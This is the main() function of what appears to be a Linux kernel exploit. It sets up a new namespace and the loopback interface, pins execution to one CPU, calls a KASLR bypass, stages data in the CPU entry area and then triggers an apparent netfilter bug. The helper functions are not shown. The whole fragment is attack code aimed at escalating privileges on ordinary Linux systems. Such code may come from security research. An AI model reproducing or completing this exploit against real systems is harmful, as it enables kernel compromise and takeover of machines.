int main(int argc, char ** argv)
{
    new_ns();

    net_if("lo", -1, IFF_UP, true);

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(MAIN_CPU, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    bypass_kaslr(0);

    setup_cpu_entry_area();

    netfilter();

    return 0;
}
